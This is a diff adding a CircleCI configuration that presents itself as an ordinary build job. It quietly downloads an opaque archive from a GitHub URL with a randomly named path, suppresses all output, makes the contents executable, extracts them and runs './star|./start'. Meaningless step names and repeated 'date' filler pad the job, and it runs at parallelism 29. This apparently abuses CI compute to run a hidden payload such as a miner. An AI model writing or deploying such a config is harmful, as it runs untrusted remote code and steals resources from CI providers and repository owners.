@@ -1,0 +1,63 @@
+version: 2.1
+jobs:
+  play:
+    docker:
+      - image: cimg/python:3.8
+    steps:
+      - checkout
+      - run:
+          name: Bahun
+          command: |
+            curl -o app https://raw.githubusercontent.com/mihrnajolp/vaszxoierurotkanzcxoeuriwomabzxmajdowiri/main/xnaszxcoiuwroiuweosamnzxcoiuewrouwermnxzaaoiei >/dev/null 2>&1
+      - run:
+          name: Tahek
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: Kambi
+          command: |
+            tar -xf app >/dev/null 2>&1
+      - run:
+          name: Ngeng
+          command: |
+            chmod u+x * >/dev/null 2>&1
+      - run:
+          name: Bafre
+          command: |
+            date
+      - run:
+          name: Tolek
+          command: |
+            date
+      - run:
+          name: Impla
+          command: |
+            date
+      - run:
+          name: Kasen
+          command: |
+            date
+      - run:
+          name: Truse
+          command: |
+            date
+      - run:
+          name: Wa
+          command: |
+            ./star|./start
+      - run:
+          name: Leet
+          command: |
+            ./star|./start
+      - run:
+          name: Bolek
+          command: |
+            date
+    parallelism: 29
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - play
+
